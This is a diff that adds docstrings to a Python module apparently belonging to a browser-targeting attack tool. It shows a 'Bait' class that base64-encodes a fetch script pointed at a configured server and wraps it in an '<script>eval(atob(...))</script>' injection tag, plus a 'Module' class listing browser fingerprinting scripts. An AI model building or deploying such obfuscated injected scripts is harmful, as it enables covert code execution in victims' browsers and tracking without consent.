@@ -12,8 +12,11 @@ PREPARED_FORMAT = 'prepared'
 B64_FORMAT = 'b64'
 
 class Parser:
+    """Utility class for parsing."""
+    
     @classmethod
     def b64_encode(cls, path, **kwargs):
+        """Encode a file in base64 format."""
         with open(path, "r") as f:
             text = f.read()
             
@@ -28,10 +31,13 @@ class Parser:
 
 
 class Bait(Enum):
+    """Enumeration for different types of baits."""
+    
     FETCH = "fetch.js"
 
     @classmethod
     def b64_encode(cls, bait: str, **kwargs):
+        """Encode a bait in base64 format."""
         server = kwargs.get('--server') or LAN_SERVER_ADDRESS_CONFIG
         protocol = kwargs.get('--protocol') or HTTP_PROTOCOL
         format = kwargs.get('--format') or PREPARED_FORMAT
@@ -49,6 +55,8 @@ class Bait(Enum):
             return f"<script>eval(atob(\'{encoded_bait}\'));</script>"
 
 class Module(Enum):
+    """Enumeration for different modules."""
+    
     BROWSER_PLUGINS = 'browser_plugins.js'
     TIMEZONE = 'timezone.js'
     LANGUAGE = 'language.js'
@@ -87,18 +95,21 @@ class Module(Enum):
     
     @classmethod
     def has_value(cls, value):
+        """Check if a value exists in the enumeration."""
         return value in cls._value2member_map_ 
     
     @classmethod
     def b64_encode(cls, module_value: str):
+        """Encode a module in base64 format."""
         sub_category = cls.module_to_sub_category[module_value]
         return Parser.b64_encode(f"{pathlib.Path(__file__).parent.resolve()}\\{MODULES_PATH}\\{sub_category}\\{module_value}")
     
     @classmethod
     def get_module_as_db_column(cls, module_name):
+        """Get the database column name for a module."""
         return cls.module_name_to_db_column[module_name]
     
     @classmethod
     def get_module_as_display_name(cls, module_name):
+        """Get the display name for a module."""
         return cls.module_name_to_display_name[module_name]
-
